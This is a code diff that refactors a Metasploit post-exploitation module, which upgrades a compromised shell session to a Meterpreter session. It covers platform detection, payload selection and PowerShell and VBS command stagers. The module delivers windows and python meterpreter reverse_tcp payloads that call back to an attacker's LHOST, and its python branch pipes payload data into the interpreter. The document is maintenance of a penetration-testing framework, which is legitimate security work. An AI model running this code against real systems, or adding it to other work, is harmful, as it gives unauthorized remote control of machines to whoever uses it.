@@ -1,10 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/exploit/powershell'
 require 'msf/core/post/windows/powershell'
 
@@ -28,13 +26,13 @@ class MetasploitModule < Msf::Post
       ))
     register_options(
       [
-        OptAddress.new('LHOST',
+        OptAddressLocal.new('LHOST',
           [false, 'IP of host that will receive the connection from the payload (Will try to auto detect).', nil]),
         OptInt.new('LPORT',
           [true, 'Port for payload to connect to.', 4433]),
         OptBool.new('HANDLER',
           [ true, 'Start an exploit/multi/handler to receive the connection', true])
-      ], self.class)
+      ])
     register_advanced_options([
       OptInt.new('HANDLE_TIMEOUT',
         [true, 'How long to wait (in seconds) for the session to come back.', 30]),
@@ -46,7 +44,7 @@ class MetasploitModule < Msf::Post
         [false, 'Remote path to drop binary']),
       OptString.new('BOURNE_FILE',
         [false, 'Remote filename to use for dropped binary'])
-    ], self.class)
+    ])
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
 
@@ -80,18 +78,18 @@ class MetasploitModule < Msf::Post
 
     # Handle platform specific variables and settings
     case session.platform
-    when /win/i
-      platform = 'win'
+    when 'windows'
+      platform = 'windows'
       payload_name = 'windows/meterpreter/reverse_tcp'
       lplat = [Msf::Platform::Windows]
       larch = [ARCH_X86]
       psh_arch = 'x86'
       vprint_status("Platform: Windows")
-    when /osx/i
+    when 'osx'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: OS X")
-    when /solaris/i
+    when 'solaris'
       platform = 'python'
       payload_name = 'python/meterpreter/reverse_tcp'
       vprint_status("Platform: Solaris")
@@ -116,7 +114,7 @@ class MetasploitModule < Msf::Post
         vprint_status("Platform: Python [fallback]")
       end
     end
-    payload_name = datastore['PAYLOAD_OVERWRITE'] if datastore['PAYLOAD_OVERWRITE']
+    payload_name = datastore['PAYLOAD_OVERRIDE'] if datastore['PAYLOAD_OVERRIDE']
     vprint_status("Upgrade payload: #{payload_name}")
 
     if platform.blank?
@@ -139,9 +137,9 @@ class MetasploitModule < Msf::Post
     end
 
     case platform
-    when 'win'
+    when 'windows'
       if session.type == 'powershell'
-        template_path = File.join(Msf::Config.data_directory, 'templates', 'scripts')
+        template_path = Rex::Powershell::Templates::TEMPLATE_DIR
         psh_payload = case datastore['Powershell::method']
                       when 'net'
                         Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload_data)
@@ -174,7 +172,7 @@ class MetasploitModule < Msf::Post
       end
     when 'python'
       vprint_status("Transfer method: Python")
-      cmd_exec("python -c \"#{payload_data}\"")
+      cmd_exec("echo \"#{payload_data}\" | python")
     else
       vprint_status("Transfer method: Bourne shell [fallback]")
       exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
@@ -200,8 +198,8 @@ class MetasploitModule < Msf::Post
       :linemax => linemax,
       #:nodelete => true # keep temp files (for debugging)
     }
-    if session.platform =~ /win/i
-      opts[:decoder] = File.join(Msf::Config.data_directory, 'exploits', 'cmdstager', 'vbs_b64')
+    if session.platform == 'windows'
+      opts[:decoder] = File.join(Rex::Exploitation::DATA_DIR, "exploits", "cmdstager", 'vbs_b64')
       cmdstager = Rex::Exploitation::CmdStagerVBS.new(exe)
     else
       opts[:background] = true
